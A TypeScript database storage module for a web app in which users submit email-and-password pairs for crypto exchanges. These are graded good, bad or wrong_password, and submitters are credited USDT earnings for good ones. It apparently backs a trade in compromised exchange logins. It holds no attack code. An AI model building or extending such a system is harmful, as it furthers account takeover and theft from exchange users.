import { drizzle } from "drizzle-orm/node-postgres";
import pg from "pg";
import { eq, desc, sql, like, or, and, count } from "drizzle-orm";
import {
  users,
  submissions,
  exchanges,
  notifications,
  settings,
  userStats,
  type User,
  type InsertUser,
  type Submission,
  type InsertSubmission,
  type Exchange,
  type InsertExchange,
  type Notification,
  type InsertNotification,
  type Setting,
  type UserStats,
} from "@shared/schema";

const { Pool } = pg;

// Parse DATABASE_URL to extract credentials if provided as connection string
const dbUrl = process.env.DATABASE_URL;
let poolConfig: any = {};

if (dbUrl) {
  try {
    const url = new URL(dbUrl);
    poolConfig = {
      user: url.username || 'postgres',
      password: url.password || undefined,
      host: url.hostname || 'localhost',
      port: url.port ? parseInt(url.port) : 5432,
      database: url.pathname?.slice(1) || 'myapp',
    };
  } catch (e) {
    // Fallback to connection string if URL parsing fails
    poolConfig = { connectionString: dbUrl };
  }
} else {
  poolConfig = {
    user: 'postgres',
    password: 'postgres',
    host: 'localhost',
    port: 5432,
    database: 'myapp',
  };
}

const pool = new Pool(poolConfig);

export const db = drizzle(pool);

export type SubmissionWithUser = Submission & { username: string };

export interface IStorage {
  // Users
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  getAllUsers(): Promise<User[]>;
  approveUser(id: number): Promise<User | undefined>;
  toggleUserEnabled(id: number): Promise<User | undefined>;
  resetUserPassword(id: number, newPassword: string): Promise<User | undefined>;
  deleteUser(id: number): Promise<boolean>;

  // Submissions
  getAllSubmissions(): Promise<Submission[]>;
  getAllSubmissionsWithUsers(): Promise<SubmissionWithUser[]>;
  getSubmissionsWithUsersPaginated(page: number, limit: number, search?: string, statusFilter?: string): Promise<{ data: SubmissionWithUser[]; total: number; page: number; limit: number; totalPages: number }>;
  getSubmissionsByUserId(userId: number): Promise<Submission[]>;
  getSubmissionById(id: number): Promise<Submission | undefined>;
  createSubmission(submission: InsertSubmission): Promise<Submission>;
  updateSubmission(id: number, data: { email?: string; passwordHash?: string; exchange?: string }): Promise<Submission | undefined>;
  updateSubmissionStatus(id: number, status: string): Promise<Submission | undefined>;
  deleteSubmission(id: number): Promise<boolean>;

  // Exchanges
  getAllExchanges(): Promise<Exchange[]>;
  getActiveExchanges(): Promise<Exchange[]>;
  createExchange(exchange: InsertExchange): Promise<Exchange>;
  toggleExchange(id: number): Promise<Exchange | undefined>;
  updateExchangePrice(id: number, priceUsdt: string): Promise<Exchange | undefined>;

  // Notifications
  getNotificationsByUserId(userId: number): Promise<Notification[]>;
  createNotification(notification: InsertNotification): Promise<Notification>;
  markNotificationsRead(userId: number): Promise<void>;

  // Settings
  getSetting(key: string): Promise<string | null>;
  setSetting(key: string, value: string): Promise<Setting>;
}

export class DatabaseStorage implements IStorage {
  // Users
  async getUser(id: number): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id)).limit(1);
    return user;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username)).limit(1);
    return user;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db.insert(users).values(insertUser).returning();
    // Initialize user stats
    await db.insert(userStats).values({
      userId: user.id,
      totalSubmissions: 0,
      totalGood: 0,
      totalBad: 0,
      totalWrongPassword: 0,
      totalEarnings: "0",
    }).onConflictDoNothing();
    return user;
  }

  async getAllUsers(): Promise<User[]> {
    return db.select().from(users).orderBy(desc(users.createdAt));
  }

  async approveUser(id: number): Promise<User | undefined> {
    const [user] = await db.update(users)
      .set({ isApproved: true })
      .where(eq(users.id, id))
      .returning();
    return user;
  }

  async toggleUserEnabled(id: number): Promise<User | undefined> {
    const [existing] = await db.select().from(users).where(eq(users.id, id)).limit(1);
    if (!existing) return undefined;
    
    const [user] = await db.update(users)
      .set({ isEnabled: !existing.isEnabled })
      .where(eq(users.id, id))
      .returning();
    return user;
  }

  async resetUserPassword(id: number, newPassword: string): Promise<User | undefined> {
    const [user] = await db.update(users)
      .set({ password: newPassword })
      .where(eq(users.id, id))
      .returning();
    return user;
  }

  async deleteUser(id: number): Promise<boolean> {
    // First delete all notifications for this user
    await db.delete(notifications).where(eq(notifications.userId, id));
    
    // Then delete all submissions for this user
    await db.delete(submissions).where(eq(submissions.userId, id));

    // Delete user stats for this user to avoid FK constraint failures
    await db.delete(userStats).where(eq(userStats.userId, id));
    
    // Finally delete the user permanently
    const result = await db.delete(users).where(eq(users.id, id)).returning();
    return result.length > 0;
  }

  // Submissions
  async getAllSubmissions(): Promise<Submission[]> {
    return db.select().from(submissions).orderBy(desc(submissions.createdAt));
  }

  async getAllSubmissionsWithUsers(): Promise<SubmissionWithUser[]> {
    const result = await db
      .select({
        id: submissions.id,
        userId: submissions.userId,
        email: submissions.email,
        passwordHash: submissions.passwordHash,
        exchange: submissions.exchange,
        status: submissions.status,
        notes: submissions.notes,
        createdAt: submissions.createdAt,
        updatedAt: submissions.updatedAt,
        username: users.username,
      })
      .from(submissions)
      .leftJoin(users, eq(submissions.userId, users.id))
      .orderBy(desc(submissions.createdAt));
    
    return result.map(row => ({
      ...row,
      username: row.username || 'Unknown',
    }));
  }

  async getSubmissionsWithUsersPaginated(
    page: number, 
    limit: number, 
    search?: string, 
    statusFilter?: string
  ): Promise<{ data: SubmissionWithUser[]; total: number; page: number; limit: number; totalPages: number }> {
    const offset = (page - 1) * limit;
    
    // Build where conditions
    const conditions: any[] = [];
    
    if (search) {
      conditions.push(
        or(
          like(submissions.email, `%${search}%`),
          like(users.username, `%${search}%`),
          like(submissions.exchange, `%${search}%`)
        )
      );
    }
    
    if (statusFilter && statusFilter !== 'all') {
      conditions.push(eq(submissions.status, statusFilter));
    }
    
    const whereClause = conditions.length > 0 ? and(...conditions) : undefined;
    
    // Get total count
    const countQuery = db
      .select({ count: count() })
      .from(submissions)
      .leftJoin(users, eq(submissions.userId, users.id));
    
    if (whereClause) {
      countQuery.where(whereClause);
    }
    
    const [{ count: total }] = await countQuery;
    
    // Get paginated data
    const query = db
      .select({
        id: submissions.id,
        userId: submissions.userId,
        email: submissions.email,
        passwordHash: submissions.passwordHash,
        exchange: submissions.exchange,
        status: submissions.status,
        notes: submissions.notes,
        createdAt: submissions.createdAt,
        updatedAt: submissions.updatedAt,
        username: users.username,
      })
      .from(submissions)
      .leftJoin(users, eq(submissions.userId, users.id))
      .orderBy(desc(submissions.createdAt))
      .limit(limit)
      .offset(offset);
    
    if (whereClause) {
      query.where(whereClause);
    }
    
    const result = await query;
    
    return {
      data: result.map(row => ({
        ...row,
        username: row.username || 'Unknown',
      })),
      total: Number(total),
      page,
      limit,
      totalPages: Math.ceil(Number(total) / limit),
    };
  }

  async getSubmissionsByUserId(userId: number): Promise<Submission[]> {
    return db.select().from(submissions)
      .where(eq(submissions.userId, userId))
      .orderBy(desc(submissions.createdAt));
  }

  async getSubmissionById(id: number): Promise<Submission | undefined> {
    const [submission] = await db.select().from(submissions).where(eq(submissions.id, id)).limit(1);
    return submission;
  }

  async createSubmission(insertSubmission: InsertSubmission): Promise<Submission> {
    const [submission] = await db.insert(submissions).values(insertSubmission).returning();
    return submission;
  }

  async updateSubmission(id: number, data: { email?: string; passwordHash?: string; exchange?: string }): Promise<Submission | undefined> {
    const updateData: Record<string, any> = { updatedAt: new Date() };
    if (data.email !== undefined && data.email !== '') updateData.email = data.email;
    if (data.passwordHash !== undefined && data.passwordHash !== '') updateData.passwordHash = data.passwordHash;
    if (data.exchange !== undefined && data.exchange !== '') updateData.exchange = data.exchange;
    
    const [submission] = await db.update(submissions)
      .set(updateData)
      .where(eq(submissions.id, id))
      .returning();
    return submission;
  }

  async updateSubmissionStatus(id: number, status: string): Promise<Submission | undefined> {
    const [submission] = await db.update(submissions)
      .set({ status, updatedAt: new Date() })
      .where(eq(submissions.id, id))
      .returning();
    return submission;
  }

  async deleteSubmission(id: number): Promise<boolean> {
    const result = await db.delete(submissions).where(eq(submissions.id, id)).returning();
    return result.length > 0;
  }

  // Exchanges
  async getAllExchanges(): Promise<Exchange[]> {
    return db.select().from(exchanges).orderBy(desc(exchanges.createdAt));
  }

  async getActiveExchanges(): Promise<Exchange[]> {
    return db.select().from(exchanges).where(eq(exchanges.isActive, true));
  }

  async createExchange(insertExchange: InsertExchange): Promise<Exchange> {
    const [exchange] = await db.insert(exchanges).values(insertExchange).returning();
    return exchange;
  }

  async toggleExchange(id: number): Promise<Exchange | undefined> {
    const [exchange] = await db.select().from(exchanges).where(eq(exchanges.id, id)).limit(1);
    if (!exchange) return undefined;
    
    const [updated] = await db.update(exchanges)
      .set({ isActive: !exchange.isActive })
      .where(eq(exchanges.id, id))
      .returning();
    return updated;
  }

  async updateExchangePrice(id: number, priceUsdt: string): Promise<Exchange | undefined> {
    const [updated] = await db.update(exchanges)
      .set({ priceUsdt })
      .where(eq(exchanges.id, id))
      .returning();
    return updated;
  }

  // Notifications
  async getNotificationsByUserId(userId: number): Promise<Notification[]> {
    return db.select().from(notifications)
      .where(eq(notifications.userId, userId))
      .orderBy(desc(notifications.createdAt));
  }

  async createNotification(insertNotification: InsertNotification): Promise<Notification> {
    const [notification] = await db.insert(notifications).values(insertNotification).returning();
    return notification;
  }

  async markNotificationsRead(userId: number): Promise<void> {
    await db.update(notifications)
      .set({ read: true })
      .where(eq(notifications.userId, userId));
  }

  // Settings
  async getSetting(key: string): Promise<string | null> {
    const [setting] = await db.select().from(settings).where(eq(settings.key, key)).limit(1);
    return setting?.value || null;
  }

  async setSetting(key: string, value: string): Promise<Setting> {
    const existing = await this.getSetting(key);
    if (existing !== null) {
      const [updated] = await db.update(settings)
        .set({ value, updatedAt: new Date() })
        .where(eq(settings.key, key))
        .returning();
      return updated;
    } else {
      const [created] = await db.insert(settings)
        .values({ key, value })
        .returning();
      return created;
    }
  }

  async getUserStats(userId: number): Promise<UserStats | undefined> {
    const stats = await db.select().from(userStats).where(eq(userStats.userId, userId));
    return stats[0];
  }

  async incrementUserStats(userId: number, status: string, amount: string = "0"): Promise<UserStats | undefined> {
    const updates: any = {
      totalSubmissions: sql`${userStats.totalSubmissions} + 1`,
      lifetimeSubmissions: sql`${userStats.lifetimeSubmissions} + 1`,
      updatedAt: new Date(),
    };

    if (status === "good") {
      updates.totalGood = sql`${userStats.totalGood} + 1`;
      updates.lifetimeGood = sql`${userStats.lifetimeGood} + 1`;
      updates.totalEarnings = sql`${userStats.totalEarnings} + ${amount}::numeric`;
      updates.lifetimeEarnings = sql`${userStats.lifetimeEarnings} + ${amount}::numeric`;
    } else if (status === "bad") {
      updates.totalBad = sql`${userStats.totalBad} + 1`;
      updates.lifetimeBad = sql`${userStats.lifetimeBad} + 1`;
    } else if (status === "wrong_password") {
      updates.totalWrongPassword = sql`${userStats.totalWrongPassword} + 1`;
      updates.lifetimeWrongPassword = sql`${userStats.lifetimeWrongPassword} + 1`;
    }

    const result = await db.update(userStats)
      .set(updates)
      .where(eq(userStats.userId, userId))
      .returning();
    return result[0];
  }

  // Called when a new submission is created. Increments current and lifetime submission counters.
  async recordNewSubmission(userId: number): Promise<UserStats | undefined> {
    const result = await db.update(userStats)
      .set({
        totalSubmissions: sql`${userStats.totalSubmissions} + 1`,
        lifetimeSubmissions: sql`${userStats.lifetimeSubmissions} + 1`,
        updatedAt: new Date(),
      })
      .where(eq(userStats.userId, userId))
      .returning();
    return result[0];
  }

  // Called when a submission's status is finalized/changed (e.g. pending -> good/bad/wrong_password).
  // This updates status-specific counters and earnings (both current and lifetime), but DOES NOT
  // increment the submission counters (those are handled at creation time).
  async recordStatusResult(userId: number, status: string, amount: string = "0"): Promise<UserStats | undefined> {
    const updates: any = {
      updatedAt: new Date(),
    };

    if (status === "good") {
      updates.totalGood = sql`${userStats.totalGood} + 1`;
      updates.lifetimeGood = sql`${userStats.lifetimeGood} + 1`;
      updates.totalEarnings = sql`${userStats.totalEarnings} + ${amount}::numeric`;
      updates.lifetimeEarnings = sql`${userStats.lifetimeEarnings} + ${amount}::numeric`;
    } else if (status === "bad") {
      updates.totalBad = sql`${userStats.totalBad} + 1`;
      updates.lifetimeBad = sql`${userStats.lifetimeBad} + 1`;
    } else if (status === "wrong_password") {
      updates.totalWrongPassword = sql`${userStats.totalWrongPassword} + 1`;
      updates.lifetimeWrongPassword = sql`${userStats.lifetimeWrongPassword} + 1`;
    }

    const result = await db.update(userStats)
      .set(updates)
      .where(eq(userStats.userId, userId))
      .returning();
    return result[0];
  }

  async decrementUserStats(userId: number, status: string, amount: string = "0"): Promise<UserStats | undefined> {
    const updates: any = {
      totalSubmissions: sql`GREATEST(${userStats.totalSubmissions} - 1, 0)`,
      updatedAt: new Date(),
    };

    if (status === "good") {
      updates.totalGood = sql`GREATEST(${userStats.totalGood} - 1, 0)`;
      updates.totalEarnings = sql`GREATEST(${userStats.totalEarnings} - ${amount}::numeric, 0)`;
    } else if (status === "bad") {
      updates.totalBad = sql`GREATEST(${userStats.totalBad} - 1, 0)`;
    } else if (status === "wrong_password") {
      updates.totalWrongPassword = sql`GREATEST(${userStats.totalWrongPassword} - 1, 0)`;
    }

    const result = await db.update(userStats)
      .set(updates)
      .where(eq(userStats.userId, userId))
      .returning();
    return result[0];
  }
}

export const storage = new DatabaseStorage();
